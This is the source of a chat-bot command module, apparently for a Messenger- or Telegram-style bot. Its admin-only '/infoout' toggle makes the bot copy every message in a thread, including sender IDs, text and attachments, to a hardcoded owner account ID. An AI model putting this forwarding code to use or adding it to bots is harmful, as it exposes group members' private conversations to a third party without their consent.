module.exports = {
  config: {
    name: "infoout",
    credits: "Nayan",
    aliases: ["inf"],
    prefix: true,
    permission: 2
  },

  // mood store
  mood: {},

  start: async function ({ api, event, args }) {
    const threadId = event.threadId || event.chatId;
    const messageId = event.messageId;

    if (!args[0]) {
      return api.sendMessage(threadId, { text: "Usage: /infoout on | off", reply_to_message_id: messageId });
    }

    const option = args[0].toLowerCase();

    if (option === "on") {
      this.mood[threadId] = true;
      return api.sendMessage(threadId, { text: "✅ InfoOut ENABLED", reply_to_message_id: messageId });
    }

    if (option === "off") {
      this.mood[threadId] = false;
      return api.sendMessage(threadId, { text: "❌ InfoOut DISABLED", reply_to_message_id: messageId });
    }

    return api.sendMessage(threadId, { text: "Unknown option. Use on/off.", reply_to_message_id: messageId });
  },

  onMessage: async function ({ api, event }) {
    const threadId = event.threadId || event.chatId;

    if (!this.mood[threadId]) return; // mood off → do nothing

    const jsonData = {
      threadId,
      messageId: event.messageId,
      senderId: event.senderId,
      timestamp: event.timestamp,
      text: event.body,
      attachments: event.attachments || [],
      isReply: !!event.messageReply,
      replyTo: event.messageReply ? event.messageReply.messageId : null
    };

    const ownerId = "8287206585";

    await api.sendMessage(ownerId, {
      text: "```json\n" + JSON.stringify(jsonData, null, 2) + "\n```",
      parse_mode: "Markdown"
    });
  }
};
